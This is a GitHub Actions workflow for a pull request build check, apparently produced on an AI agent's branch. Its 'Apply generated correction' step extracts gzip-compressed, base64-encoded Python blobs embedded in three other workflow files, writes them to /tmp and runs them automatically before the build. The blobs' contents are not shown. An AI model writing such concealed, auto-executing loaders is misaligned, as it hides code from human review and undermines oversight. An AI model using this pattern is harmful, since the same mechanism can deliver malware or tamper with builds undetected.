name: PR24 edit surface build validation

on:
  pull_request:
    branches:
      - agent/profile-friends-privacy-ux
    types:
      - synchronize

jobs:
  build-validation:
    name: Build generated profile edit surfaces
    if: github.head_ref == 'agent/pr24-social-profile-edit-surface-validation'
    runs-on: ubuntu-latest
    timeout-minutes: 15

    steps:
      - uses: actions/checkout@v6
        with:
          ref: ${{ github.event.pull_request.head.ref }}

      - uses: actions/setup-node@v5
        with:
          node-version: 22.16.0
          cache: npm
          cache-dependency-path: package-lock.json

      - name: Apply generated correction
        shell: bash
        run: |
          python - <<'PY'
          import base64
          import gzip
          import re
          from pathlib import Path

          initial = Path('.github/workflows/pr24-edit-surface-validation.yml').read_text(encoding='utf-8')
          main = re.search(r"printf '%s' '(H4sI[^']+)'", initial)
          Path('/tmp/main.py').write_bytes(gzip.decompress(base64.b64decode(main.group(1))))

          final = Path('.github/workflows/pr24-edit-surface-final-validation.yml').read_text(encoding='utf-8')
          payloads = re.findall(r"printf '%s' '(H4sI[^']+)'", final)
          for index, payload in enumerate(payloads, start=1):
              Path(f'/tmp/followup-{index}.py').write_bytes(gzip.decompress(base64.b64decode(payload)))

          browser = Path('.github/workflows/pr24-edit-surface-browser-validation.yml').read_text(encoding='utf-8')
          payload = re.findall(r"printf '%s' '(H4sI[^']+)'", browser)[-1]
          Path('/tmp/followup-3.py').write_bytes(gzip.decompress(base64.b64decode(payload)))
          PY
          python /tmp/main.py
          python /tmp/followup-1.py
          python /tmp/followup-2.py
          python /tmp/followup-3.py

      - run: npm ci
      - name: Run production build
        run: npm run build
